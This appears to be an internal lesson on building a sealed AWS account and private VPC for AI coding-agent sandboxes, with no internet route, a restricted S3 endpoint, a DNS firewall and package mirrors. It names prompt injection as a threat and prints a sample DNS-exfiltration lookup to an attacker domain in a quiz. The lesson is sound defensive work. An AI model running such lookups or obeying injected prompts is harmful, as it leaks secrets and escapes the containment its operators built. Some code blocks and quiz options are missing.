title: The account and the network
bridge: The sandbox network is like an office network with no door to the street. Machines inside talk to each other and to a few named services. Except 'private' here does not mean a firewall that filters. It means there is no route out at all, and every way out is one we add on purpose.
intro: Every sandbox VM runs inside one AWS account and one private network. This lesson builds both. You get the account and its hand-made role, a VPC with no route to the internet, and a DNS firewall. Then the runs bucket and the package mirrors. Four DevOps tickets, done once, that every later ticket stands on.

npm, pip and Docker pulls come from mirrors we run, never from the internet

sections.h: A new account, a new box
p: A sandbox reads untrusted text: Jira tickets, PR comments, web pages copied into issues. So it gets an AWS account of its own, called ai-agents. Nothing in it has a path to prod, QA or dev.

DevOps creates the account in Control Tower, AWS's tool for making accounts inside our organization. This happens outside the infrastructure repo. The account goes into its own OU (organizational unit, a folder of accounts that share rules).

The OU gets SCPs. An SCP (service control policy) is an organization-level rule that limits every role in the account, even an admin. Ours allow only us-east-1, deny leaving the organization, and deny VPC peering, Transit Gateway attachments and NAT gateways.
One role is exempt from the network denies: TerraformDeploymentRole, which builds the network. Every other role, including anything a sandbox could reach, cannot open a path out.

callout.text: No peering is not a promise in a README. The SCP makes it an infrastructure wall: a peering call from any other role fails, whatever its own policy says.

sections.h: Two roles by hand, then the tree
p: A new account arrives empty. Terragrunt cannot log in to it yet, because it assumes TerraformDeploymentRole and that role does not exist. So DevOps creates it once, by hand, with the same trust policy as the solutions account's role (account 367879749310).

Then the account joins the new Terragrunt tree: terraform/accounts/ai-agents/. We copy four files from terraform/accounts/solutions/: account.hcl, aws/cloud.hcl, aws/us-east-1/region.hcl and aws/global/region.hcl. We drop the GCP parts and cloud_environments.

One more unit, aws/global/iam/github-actions/, is the OIDC role that GitHub Actions jobs assume (lesson p2-3). It is copied from solutions' main.tf, with one change. Solutions trusts every repo; ours trusts only repo:RhinoHealth/infrastructure:environment:ai-agents. A GitHub environment called ai-agents in the infrastructure repo holds AWS_ROLE_ARN and AWS_REGION.
sections.because: We write account.hcl first, because root.hcl reads it for every unit in the account: the role, the prefix and the tags.

code.text:
# Set common variables for the ai-agents account (sandboxes for AI coding agents). Pulled in by
# terraform/root.hcl and passed to child modules as inputs. Copied from solutions/account.hcl.
locals {
  account_name = "ai-agents"
  project      = "rhinofcp"

  # Created in Control Tower; TerraformDeploymentRole was bootstrapped by hand (see README).
  assume_role_arn = "arn:aws:iam::<AI_AGENTS_ACCOUNT_ID>:role/TerraformDeploymentRole"

  # Prefix for sandbox resources. Not "agents": in this repo that word means Rhino Client VMs.
  name_prefix = "ai-agents"

  tags = {
    account_name          = "ai-agents"
    VantaNonProd          = "true"
    VantaContainsUserData = "false" # fake seed data only, never PHI
    VantaOwner            = "tal@example.com"
    created_by            = "terraform"
    project               = "rhinofcp"
  }
}

notes.text: The comment says where this file is read: terraform/root.hcl pulls it in and passes it to every module as inputs.
locals is a block of named values. Other files read them as local.account.locals.<name>.
New accounts use project = "rhinofcp", like the solutions account.
The role Terragrunt assumes for every plan and apply here. The account ID is filled in once Control Tower creates the account.
Every sandbox resource starts with ai-agents. The word agents alone already means Rhino Client VMs in this repo.
Tags go on every resource. Vanta, our compliance tool, reads them.
VantaContainsUserData = false: sandboxes hold fake seed data only, never PHI.
Tal owns the account in Vanta. Ask Tal before the PR.

sections.ifInstead: If instead terragrunt plan says AccessDenied on sts:AssumeRole, the hand-made TerraformDeploymentRole is missing or its trust policy differs from the solutions role. Compare the two in the IAM console with DevOps.

sections.h: A VPC with no way out
p: Our infrastructure repo has modules/aws-vpc. It always adds public subnets, a NAT gateway and public IPs on launch. A sandbox must have none of these. So G3-03 copies it to modules/aws-vpc-private and turns every way out off.
The module still uses the community module terraform-aws-modules/vpc at version 6.5.1. We only change its inputs.
sections.because: We switch the gateway, NAT and public IPs off by name, because a module default can change in any upgrade.

code.text:
# Private-only VPC for AI agent sandboxes: no IGW, no NAT, no public subnets.
# The only ways out are the egress proxy (G3-09) and PrivateLink to inf (G3-17).
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "6.5.1"

  name            = local.vpc_name
  cidr            = var.vpc_cidr
  azs             = slice(data.aws_availability_zones.available.names, 0, 3)
  private_subnets = [for n in range(3) : cidrsubnet(var.vpc_cidr, 2, n)] # three /18s
  public_subnets  = []

  create_igw                = false
  enable_nat_gateway        = false
  map_public_ip_on_launch   = false
  enable_dns_hostnames      = true
  enable_flow_log           = true
  flow_log_destination_type = "s3"
  flow_log_destination_arn  = module.s3_bucket.s3_bucket_arn
  tags                      = var.tags
}

notes.text: The two ways out we add later: the egress proxy (lesson g3-6) and PrivateLink to inf (lesson g3-3).
slice(..., 0, 3) takes the first three availability zones (separate data centres in us-east-1) that AWS reports.
cidrsubnet(var.vpc_cidr, 2, n) adds 2 bits to the /16, so each subnet is a /18 (16,384 addresses). n = 0, 1, 2 gives three of the four /18s.
No public subnets at all.
No internet gateway: nothing in this VPC can route to the internet.
No NAT gateway either. The SCP would refuse one anyway.
No public IP on any VM launched here.
Flow logs record every connection attempt in and out of the VPC. They are always on.
They go to the module's own S3 bucket, with force_destroy = false and a 365-day expiry.

callout.text: The module uses n = 0, 1 and 2, the first three /18s. The fourth, 10.60.192.0/18, stays free for the egress proxy's own subnets (G3-09).

sections.h: The S3 door opens to our buckets only
p: A VPC endpoint lets machines in a private VPC reach an AWS service without the internet. S3 uses a gateway endpoint: a route in the route tables, free of charge. Most other services use interface endpoints: a private IP address in each subnet, with a security group.

The old module's S3 endpoint allows everything. That sounds harmless, but it means any presigned URL works from inside. A presigned URL is a link that carries its own short-lived permission. An injected prompt could upload our code to an attacker's bucket with one.
sections.because: We list our buckets in the endpoint policy, because an endpoint that allows * turns S3 into an exit to anyone's bucket.

notes.text: The S3 endpoint is a separate resource, outside the community module, so we control its policy.
Gateway type: S3 traffic follows a route instead of an IP address.
The route goes into every private route table, so every sandbox subnet uses it.
The policy is plain IAM JSON, written with jsonencode so Terraform checks the syntax.
Only reading and writing objects. No listing buckets, no deleting, no changing policies.
One ARN per allowed bucket. Any other bucket is refused at the endpoint, before S3 sees the request.

sections.h: The unit: one CIDR, two buckets, seven endpoints
p: A unit is one terragrunt.hcl file that runs one module with its inputs. G3-04 adds the VPC unit to the new account. It looks like the solutions account's VPC unit, with our module and three new inputs.

Interface endpoints come from the community submodule terraform-aws-modules/vpc/aws//modules/vpc-endpoints. They get private DNS, so the normal AWS hostnames resolve to them. Their security group allows port 443 from the VPC only.
sections.because: We name every endpoint here, because the sandbox can reach exactly the AWS services in this list and nothing else.

notes.text: include "root" pulls in terraform/root.hcl: the remote state bucket, the providers and the role to assume.
The module source in the new tree: up from the root, then modules/aws-vpc-private.
Read account.hcl from section 2, to reuse its tags.
10.60.0.0/16 is not in the used list (10.10, 10.15, 10.20, 10.30, 10.50, 10.130.x, 10.101.160). DevOps confirms before apply.
Two buckets: our runs bucket, and the bucket where ECR keeps image layers. Without the second, docker pull fails.
ssm, ssmmessages and ec2messages let the SSM agent take commands (lesson p3-5). ecr.api and ecr.dkr pull images. logs ships logs. autoscaling lets a VM complete its lifecycle hook (lesson g3-7).
The account's tags, so Vanta sees every endpoint too.

callout.text: infra CI runs only formatting checks. Run `tofu fmt -check` and `terragrunt hcl format --check` before you push, as terrugrunt-lint.yml does. Plan locally over VPN, paste the plan into the PR, and a person applies.

sections.h: DNS firewall, private zone, runs bucket
p: No route out does not stop DNS. A lookup for <secret>.attacker.example travels through the VPC's resolver to the attacker's name server, with the secret inside the name. So G3-04 adds a Route 53 DNS firewall: a list of allowed names, checked on every lookup.

The unit core-services/dns-firewall/ has a domain list called allowed: the proxy allow-list, *.amazonaws.com and *.ai-agents.example.com. An ALLOW rule matches it. A BLOCK rule for * answers NXDOMAIN, which means 'no such name'. The rule group is associated with the VPC, and every query is logged to CloudWatch.
core-services/private-zone/ is a Route 53 private zone, ai-agents.example.com, visible only inside this VPC. Later tickets add records to it: proxy. (G3-09), and broker., gateway. and otel. (G3-17).
core-services/runs-bucket/ is rhino-ai-agents-runs, where runs save transcripts and artifacts outside the VM. It has its own KMS key, public access blocked, versioning on and a 30-day expiry.

callout.text: Rules in a DNS firewall run by priority, lowest number first, and the first match wins. The ALLOW rule needs a lower number than the BLOCK rule, or every name is blocked.

sections.h: Mirrors, part 1: an npm proxy in Nexus
p: A sandbox reinstalls packages when a lockfile changes, and FCP Lab pulls Docker images. With no internet, both must come from mirrors we run. Nexus (nexus.example.com) already proxies pypi, Docker, apt and more. It has no npm proxy yet.

G3-05 adds `npm = { "npmjs" = "https://registry.npmjs.org" }` to repositories in modules/nexus-oss/locals.tf, and the resource below next to the pypi proxy. The VM reaches Nexus through the egress proxy, where nexus.example.com is the one allowed name (lesson g3-6).
sections.because: We copy the shape of the pypi proxy, because the module already creates its blob store and shared settings.

notes.text: nexus_repository_npm_proxy comes from the Nexus Terraform provider. A proxy repository fetches from upstream once and serves its copy after that.
for_each over the npm map from locals.tf, so each.key is npmjs and each.value is the registry URL.
online = true: the repository answers requests as soon as it exists.
Packages are stored in an S3 blob store. The existing for_each in the module creates the npm one.
Refuse files whose content does not match their declared type.
The upstream registry Nexus copies from.
How long Nexus keeps a package file and its metadata before it asks upstream again. The module's shared TTL.

sections.h: Mirrors, part 2: caching and Docker images
p: Part 2 finishes the resource. Then G3-05 adds the Docker side: ECR pull-through cache rules in the ai-agents account, in a new unit core-services/ecr-pull-through/. A pull-through cache rule makes ECR fetch a public image on the first pull. After that, ECR serves its own copy.

The docker-hub rule needs credentials, stored in Secrets Manager as ecr-pullthroughcache/docker-hub (the same Docker Hub account as docker-hub-secrets). The ecr-public rule needs none. Our own rhino-* images stay in inf ECR: DevOps adds arn:aws:iam::<AI_AGENTS_ACCOUNT_ID>:root to allowed_principals in multi_tenant/accounts/infrastructure/artifacts/aws-ecr/terragrunt.hcl.
sections.because: We cache 'not found' answers and auto-block a failing upstream, because retries must not hammer npmjs or hang.

notes.text: The negative cache remembers 404 answers, so a missing package fails fast the second time.
It forgets them after the same TTL, so a newly published package appears.
blocked = false: the upstream is in use.
auto_block = true: if npmjs stops answering, Nexus stops asking for a while and serves what it has.
The module waits three minutes for Nexus to boot before it creates repositories. Every repository depends on that wait.

callout.text: Two questions stay open. G3-12 decides how sandboxes read Nexus: anonymous read on the npm and pypi proxies only, or a read-only user for those two. And Nave must say whether FCP Lab can take a registry prefix for postgres, redis, minio and orthanc.

quiz.q: Why does the S3 gateway endpoint carry a policy that lists our buckets?

options.text: Without it, a presigned URL to anyone's bucket works from inside, so an injected prompt could upload our code there.
options.why: The endpoint is the only way to S3 from the VPC. Its policy decides which buckets are reachable at all.

options.text: S3 refuses gateway endpoints that have no policy.
options.why: The old module's endpoint has no bucket list and works fine. It allows *, which is the problem.

options.text: To keep S3 transfer costs down.
options.why: Gateway endpoints are free whatever the policy says. The policy is about where data can go.

quiz.q: A sandbox runs `nslookup c2VjcmV0.attacker.example`. What happens?

options.text: The name resolves, but the VM has no route to connect, so nothing leaks.
options.why: The lookup itself carries the data to the attacker's name server. That is why we filter DNS.
SCPs limit AWS API calls made by roles. They do not see DNS queries from a VM.

options.text: The DNS firewall answers NXDOMAIN and logs the query to CloudWatch.
options.why: The name is not on the allowed list, so the BLOCK rule for * answers 'no such name'.

quiz.q: Which address range is left free for the egress proxy's own subnets?

options.why: That is cidrsubnet(..., 2, 0), the first sandbox subnet.
The module uses n = 0, 1, 2. cidrsubnet("10.60.0.0/16", 2, 3) is the spare one, and G3-09 cuts two /28s from it.
The proxy lives in the same VPC, in tiny subnets of its own with the only internet route.

words.plain: Service control policy: an organization rule that limits every role in an account, even an admin.
The AWS tool we use to create new accounts inside our organization.
A private door from a VPC to one AWS service: a route (gateway type) or a private IP (interface type).
A record of every network connection in and out of a VPC, kept in S3.
A Route 53 feature that checks every DNS lookup against a list and blocks names that are not on it.
The DNS answer 'no such name'. The firewall gives it for every blocked lookup.
An ECR rule that fetches a public image on first pull and serves its own copy after that.
